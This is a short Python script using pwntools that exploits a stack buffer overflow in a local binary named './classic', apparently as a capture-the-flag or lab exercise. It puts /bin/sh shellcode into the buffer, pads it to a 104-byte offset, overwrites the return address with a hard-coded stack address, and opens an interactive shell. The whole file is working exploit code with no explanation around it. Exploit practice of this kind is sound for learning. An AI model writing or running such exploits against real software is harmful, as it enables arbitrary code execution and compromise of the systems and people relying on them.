#!/usr/bin/env python3
from pwn import *

# Set the architecture context to 64-bit
context.arch = 'amd64'

# Generate shellcode for spawning /bin/sh
shellcode = asm(shellcraft.sh())

# Define constants
buffer_offset = 104  # Confirmed by disassembly and previous success
return_address = 0x7fffffffeca0  # Updated buffer address from output

# Create the payload
payload = b''
payload += shellcode
padding_length = buffer_offset - len(shellcode)
if padding_length < 0:
    raise ValueError(f"Shellcode too large ({len(shellcode)} bytes) for buffer offset ({buffer_offset} bytes)")
payload += b'A' * padding_length
payload += p64(return_address)

# Start the process with a PTY
p = process("./classic", setuid=False, env={})

# Send the payload
p.send(payload)

# Interact with the shell
p.interactive()
